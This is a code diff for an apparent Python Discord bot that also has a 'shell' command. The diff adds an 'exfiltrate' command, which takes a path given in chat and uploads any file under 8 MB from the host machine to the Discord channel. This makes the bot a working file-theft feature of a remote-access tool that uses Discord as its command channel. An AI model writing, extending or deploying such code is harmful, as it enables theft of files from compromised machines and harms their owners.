@@ -31,4 +31,11 @@ async def shell(ctx, *args):
 async def memory(ctx):
     await ctx.send(psutil.virtual_memory())
 
+@bot.command()
+async def exfiltrate(ctx, arg1):
+    print(os.path.getsize(arg1))
+    if os.path.getsize(arg1) < 8388608:
+        await ctx.send(file=discord.File(arg1))
+    #await ctx.file.send(arg1)
+
 bot.run(token)
